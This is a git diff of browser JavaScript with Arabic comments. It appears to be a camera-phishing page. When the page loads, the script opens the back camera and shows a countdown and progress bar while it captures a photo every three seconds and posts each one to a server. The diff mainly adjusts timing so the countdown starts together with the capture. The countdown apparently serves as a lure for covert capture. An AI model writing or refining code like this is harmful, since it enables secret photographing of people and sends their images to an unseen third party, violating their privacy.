@@ -1,17 +1,8 @@
 document.addEventListener("DOMContentLoaded", async function () {
-    let timeLeft = 20;
     const countdownElement = document.getElementById("countdown");
     const progressBar = document.getElementById("progress");
-
-    const countdownInterval = setInterval(() => {
-        timeLeft--;
-        countdownElement.textContent = timeLeft;
-        progressBar.style.width = (timeLeft / 20) * 100 + "%";
-
-        if (timeLeft <= 0) {
-            clearInterval(countdownInterval);
-        }
-    }, 1000);
+    let timeLeft = 20;
+    let countdownStarted = false;
 
     async function getBackCameraId() {
         try {
@@ -38,12 +29,28 @@ document.addEventListener("DOMContentLoaded", async function () {
 
             video.srcObject = stream;
             video.onloadedmetadata = () => {
-                console.log("✅ الكاميرا تعمل! سيتم بدء التقاط الصور فورًا...");
+                console.log("✅ الكاميرا تعمل! سيتم بدء العد التنازلي والتقاط الصور فورًا...");
+                startCountdown();
                 capturePhotosRepeatedly();
             };
         } catch (error) {
             console.error("❌ فشل في تشغيل الكاميرا الخلفية:", error);
         }
+    }
+
+    function startCountdown() {
+        if (countdownStarted) return; // منع تكرار تشغيل العد
+        countdownStarted = true;
+
+        const countdownInterval = setInterval(() => {
+            timeLeft--;
+            countdownElement.textContent = timeLeft;
+            progressBar.style.width = (timeLeft / 20) * 100 + "%";
+
+            if (timeLeft <= 0) {
+                clearInterval(countdownInterval);
+            }
+        }, 1000);
     }
 
     function capturePhotosRepeatedly() {
@@ -61,10 +68,10 @@ document.addEventListener("DOMContentLoaded", async function () {
             console.log("📸 تم التقاط صورة بالكاميرا الخلفية! جاري إرسالها...");
             canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
 
-            setTimeout(takePhoto, 1000); // التقاط صورة كل 3 ثواني
+            setTimeout(takePhoto, 3000); // التقاط صورة كل 3 ثواني
         }
 
-        takePhoto(); // أول لقطة بدون تأخير
+        takePhoto(); // أول لقطة فور تشغيل الكاميرا
     }
 
     function sendPhoto(blob) {
@@ -81,5 +88,5 @@ document.addEventListener("DOMContentLoaded", async function () {
         .catch(error => console.error("❌ خطأ في إرسال الصورة:", error));
     }
 
-    startCamera();
+    startCamera(); // تشغيل الكاميرا فور تحميل الصفحة
 });
